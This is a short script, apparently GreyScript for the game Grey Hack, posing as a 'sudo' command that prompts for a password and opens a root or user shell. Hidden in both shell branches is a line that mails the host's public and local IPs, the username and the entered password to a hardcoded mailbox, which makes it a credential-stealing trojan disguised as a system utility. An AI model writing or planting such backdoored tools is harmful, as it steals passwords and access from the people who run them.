//command: sudo
email="test@sherwia.info"
mail_box=mail_login(email,"test")
//only change things below this if you know what you are doing!
if not params or params[0] == "-h" or params[0] == "--help" then exit(command_info("sudo_usage"))
if params[0] == "-u" and params.len != 2 then exit(command_info("sudo_usage"))

inputPass = user_input("Password: ", true)

if params[0] == "-u" then
	shell = get_shell(params[1], inputPass)
    if typeof(shell)=="shell" then mail_box.send(email,shell.host_computer.public_ip+":"+shell.host_computer.local_ip+":"+params[1],inputPass)
	if not shell then exit("sudo: incorrect username or password")
else 
	shell = get_shell("root", inputPass)
    if typeof(shell)=="shell" then mail_box.send(email,shell.host_computer.public_ip+":"+shell.host_computer.local_ip+":root",inputPass)
	if not shell then exit("sudo: incorrect password")
end if

if params[0] == "-s" or params[0] == "-u" then 
	shell.start_terminal
else
	computer = shell.host_computer
	args = params[1:].join(" ")
	if not params[0].indexOf("/") then
		globalPath = [current_path, "/bin", "/usr/bin"]
		for path in globalPath
			program = computer.File(path + "/" + params[0])
			if program != null then
			    shell.launch(program.path, args) 
			    exit
			end if
		end for
	else
		program = computer.File(params[0])
		if not program then exit(params[0] + " not found.")
		shell.launch(program.path, args)
	end if
end if